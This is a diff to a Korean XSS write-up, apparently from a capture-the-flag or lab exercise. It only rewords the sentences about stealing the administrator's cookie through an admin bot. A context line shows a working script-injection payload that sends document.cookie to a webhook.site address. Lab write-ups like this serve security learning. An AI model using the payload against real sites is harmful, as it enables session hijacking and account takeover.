@@ -90,7 +90,7 @@
 ![xss2 payload](./screenshots/xss2_me_cookie.png)
 
 - 쿠키 값이 정상적으로 수신되는 것을 확인하였다.
-이제 동일한 방식으로 **관리자 봇을 이용해 관리자 쿠키를 탈취**할 예정이다.
+이제 동일한 방식으로 **관리자 봇을 이용해 관리자 쿠키를 탈취**할 것 이다.
 
 **관리자 봇을 통하여 쿠키 값 전송**
 
@@ -122,7 +122,7 @@
 123"/><script>new Image().src="https://webhook.site/00da818a-c861-444c-8a3a-c50bd3e46a01?cookie="%2Bdocument.cookie</script>
 ```
 
-위 페이로드를 URL에 포함하여, **관리자 봇이 해당 URL에 접속하도록 유도할 예정**이다.
+위 페이로드를 URL에 포함하여, **관리자 봇이 해당 URL에 접속하도록 유도**할 것이다.
 
 ![xss3 payload](./screenshots/xss3_admin_access.png)
 
@@ -158,7 +158,7 @@
 
 ![xss4 access](./screenshots/xss4_access.png)
 
-- 페이로드가 정상적으로 동작함을 확인하였다. 이제 이를 이용해 **관리자의 쿠키 값을 탈취**할 예정이다.
+- 페이로드가 정상적으로 동작함을 확인하였다. 이제 이를 이용해 **관리자의 쿠키 값을 탈취**할 것이다.
 
 ![xss4 admin access](./screenshots/xss4_admin_access.png)
 
@@ -209,7 +209,7 @@
 
 ![xss5 access](./screenshots/xss5_access.png)
 
-- 페이로드가 정상적으로 동작함을 확인하였다. 이제 이를 이용해 **관리자의 쿠키 값을 탈취**할 것이다.
+- 페이로드가 정상적으로 동작함을 확인하였고, 이를 이용하여 **관리자의 쿠키 값을 탈취**할 것이다.
 
 ![xss5 admin access](./screenshots/xss5_admin_access.png)
 
